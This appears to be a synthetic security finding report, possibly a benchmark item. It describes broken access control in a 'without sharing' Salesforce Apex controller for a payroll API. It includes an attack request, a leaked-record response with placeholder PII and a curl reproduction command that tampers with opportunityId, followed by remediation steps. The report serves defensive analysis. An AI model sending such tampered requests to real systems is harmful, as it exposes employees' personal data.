# Security Analysis Report
**System:** WageFlow Payroll API (Salesforce-Integrated)
**Domain:** HR / Payroll
**Example ID:** SF-0046
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BAC — Pattern 2.4 | Privilege escalation via parameter tampering on `OpportunityController.getOpportunity` — attacker reads any payroll Opportunity record |

---

## Finding 1 — BAC: Privilege Escalation via Parameter Tampering on Opportunity (Pattern 2.4)

### Summary
The Apex controller `OpportunityController` on WageFlow Payroll API (`af3580b8.lightning.force.com`) is declared `without sharing`, bypassing OWD=Private on the Opportunity object. Per §5.0 Pattern 2.4, the attacker escalates their effective privilege by tampering with the `opportunityId` parameter to access Opportunity records they do not own. No SOQL ownership predicate prevents this. In an HR / payroll context, Opportunity records may contain salary negotiation records, payroll vendor agreements, and employee PII.

**Pattern:** 2.4 — Privilege escalation via parameter tampering (BAC)
**Affected controller:** `c.OpportunityController.getOpportunity`
**Affected endpoint:** `POST https://af3580b8.lightning.force.com/aura`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://af3580b8.lightning.force.com/aura
Authorization: Bearer 00DAF3580B8!ARaf3580b8...
Content-Type: application/x-www-form-urlencoded
X-SFDC-Session: 00DAF3580B8!ARaf3580b8...

message={"actions":[{"id":"1;a","descriptor":"c.OpportunityController.getOpportunity","callingDescriptor":"UNKNOWN",
"params":{"opportunityId":"00180B8","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}
&aura.token=undefined
```

**Response — Victim Payroll Opportunity Returned**
```json
{
  "actions": [{ "id": "1;a", "state": "SUCCESS", "returnValue": { "records": [{
    "Id": "00180B8", "Name": "Victim Opportunity Record", "OwnerId": "005VICTIM",
    "InternalNotes__c": "CONFIDENTIAL: internal review notes",
    "SensitiveData__c": "SSN: 000-30-2048"
  }] }, "error": [] }]
}
```

### Evidence Map

| Artifact | Value | Significance |
|---|---|---|
| §4.0 `without sharing` | Class declaration | OWD=Private bypassed |
| §5.0 Pattern 2.4 | Privilege escalation | Tampered `opportunityId` bypasses user scope |
| §7.0 OWD Opportunity: Private | Sharing config | Only owner should access |
| §8.0 RISK-SF-046 | No `with sharing` | Sharing rules not enforced |
| §8.0 RISK-SF-047 | No ownership predicate | Any `opportunityId` accepted |
| HAR `opportunityId` | `00180B8` | Victim payroll Opportunity record |
| HAR `SensitiveData__c` | `SSN: 000-30-2048` | HR / payroll employee PII |

### Steps to Reproduce

```bash
SESSION="00DAF3580B8!ARaf3580b8..."
curl -s -X POST "https://af3580b8.lightning.force.com/aura" \
  -H "Authorization: Bearer $SESSION" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "X-SFDC-Session: $SESSION" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.OpportunityController.getOpportunity","callingDescriptor":"UNKNOWN","params":{"opportunityId":"00180B8","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined'
# Expected (vulnerable): state: SUCCESS, OwnerId: 005VICTIM, SensitiveData__c: SSN: 000-30-2048
# Expected (secure): state: ERROR — INSUFFICIENT_ACCESS
```

### Remediation
1. `public with sharing class OpportunityController { ... }`
2. `WHERE Id = :opportunityId AND OwnerId = :UserInfo.getUserId()` + `WITH SECURITY_ENFORCED`
3. Remove client-controlled `fields` parameter; use server-side allowlist.
4. Validate `aura.token`.
5. **HR / payroll note:** Employee SSN exposure (`000-30-2048`) in a payroll context constitutes a breach requiring notification under applicable employment data protection law.
